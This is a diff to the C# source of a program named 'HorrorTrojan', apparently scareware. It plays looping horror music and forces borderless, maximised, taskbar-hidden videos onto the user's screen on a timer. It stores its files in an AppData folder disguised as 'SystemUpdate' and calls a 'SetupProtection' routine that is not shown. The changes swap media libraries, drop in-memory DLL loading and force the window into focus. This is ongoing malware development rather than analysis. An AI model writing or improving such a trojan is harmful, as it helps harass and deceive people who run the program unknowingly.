@@ -5,9 +5,8 @@ using System.Runtime.InteropServices;
 using System.Threading;
 using System.IO;
 using System.Diagnostics;
-using System.Media;
 using System.Reflection;
-using WMPLib;
+using AxWMPLib;
 
 namespace HorrorTrojan
 {
@@ -45,30 +44,10 @@ namespace HorrorTrojan
         private Random rnd = new Random();
         private string appDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "SystemUpdate");
         private Image gifImage;
-        private WindowsMediaPlayer musicPlayer;  // ДЛЯ МУЗЫКИ
-        private WindowsMediaPlayer videoPlayer;  // ДЛЯ ВИДЕО
+        private AxWindowsMediaPlayer videoPlayer;
+        private WMPLib.WindowsMediaPlayer musicPlayer; // МУЗЫКА (не трогаем)
 
         private string[] videoFiles = { "vd.mp4", "kj.mp4", "kf.mp4" };
-
-        // ЗАГРУЗКА DLL ИЗ ПАМЯТИ (если нужно)
-        static MainInterface()
-        {
-            AppDomain.CurrentDomain.AssemblyResolve += (sender, args) =>
-            {
-                string assemblyName = new AssemblyName(args.Name).Name;
-                if (assemblyName == "AxInterop.WMPLib" || assemblyName == "Interop.WMPLib")
-                {
-                    using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(assemblyName + ".dll"))
-                    {
-                        if (stream == null) return null;
-                        byte[] buffer = new byte[stream.Length];
-                        stream.Read(buffer, 0, buffer.Length);
-                        return Assembly.Load(buffer);
-                    }
-                }
-                return null;
-            };
-        }
 
         public MainInterface()
         {
@@ -135,8 +114,11 @@ namespace HorrorTrojan
             SetupProtection();
             PlayMusic();
 
+            // ПРИНУДИТЕЛЬНЫЙ ПОКАЗ ФОРМЫ
+            this.WindowState = FormWindowState.Normal;
             this.Show();
             this.BringToFront();
+            this.Focus();
         }
 
         private void ExtractMediaFile(string fileName)
@@ -191,7 +173,7 @@ namespace HorrorTrojan
                 string musicPath = Path.Combine(appDataPath, "dv.mp3");
                 if (File.Exists(musicPath))
                 {
-                    musicPlayer = new WindowsMediaPlayer();
+                    musicPlayer = new WMPLib.WindowsMediaPlayer();
                     musicPlayer.URL = musicPath;
                     musicPlayer.settings.autoStart = true;
                     musicPlayer.settings.setMode("loop", true);
@@ -304,7 +286,7 @@ namespace HorrorTrojan
                     return;
                 }
 
-                // ЗАПУСКАЕМ ВИДЕО В ОТДЕЛЬНОМ ОКНЕ
+                // ОТДЕЛЬНОЕ ОКНО ДЛЯ ВИДЕО (без рамок)
                 Form videoForm = new Form();
                 videoForm.FormBorderStyle = FormBorderStyle.None;
                 videoForm.WindowState = FormWindowState.Maximized;
@@ -312,37 +294,33 @@ namespace HorrorTrojan
                 videoForm.ShowInTaskbar = false;
                 videoForm.BackColor = Color.Black;
 
-                videoPlayer = new WindowsMediaPlayer();
-                videoPlayer.URL = videoPath;
-                videoPlayer.settings.autoStart = true;
+                // ПЛЕЕР В ОКНЕ
+                videoPlayer = new AxWindowsMediaPlayer();
+                videoPlayer.Dock = DockStyle.Fill;
                 videoPlayer.settings.setMode("loop", false);
-                videoPlayer.controls.play();
-
-                // ЖДЁМ ОКОНЧАНИЯ ВИДЕО
-                var videoThread = new Thread(() =>
+                videoPlayer.uiMode = "none";
+                videoPlayer.URL = videoPath;
+                videoPlayer.PlayStateChange += (s, ev) =>
                 {
-                    try
-                    {
-                        while (videoPlayer.playState != WMPPlayState.wmppsStopped &&
-                               videoPlayer.playState != WMPPlayState.wmppsMediaEnded)
-                        {
-                            Thread.Sleep(100);
-                        }
-                    }
-                    catch { }
-                    finally
+                    if (ev.newState == 8) // stopped
                     {
                         videoForm.BeginInvoke((Action)(() =>
                         {
-                            try { videoPlayer.close(); } catch { }
                             videoForm.Close();
                             isVideoActive = false;
                             videoTimer.Start();
                         }));
                     }
-                });
-                videoThread.IsBackground = true;
-                videoThread.Start();
+                };
+
+                videoForm.Controls.Add(videoPlayer);
+                videoForm.Shown += (s, ev) => videoPlayer.Ctlcontrols.play();
+                videoForm.FormClosing += (s, ev) =>
+                {
+                    try { videoPlayer.close(); } catch { }
+                    isVideoActive = false;
+                    videoTimer.Start();
+                };
 
                 videoForm.Show();
             }
@@ -434,8 +412,8 @@ namespace HorrorTrojan
                 glitchTimer?.Dispose();
                 videoTimer?.Dispose();
                 gifImage?.Dispose();
-                try { musicPlayer?.close(); } catch { }
                 try { videoPlayer?.close(); } catch { }
+                try { musicPlayer?.close(); } catch { }
             }
             base.Dispose(disposing);
         }
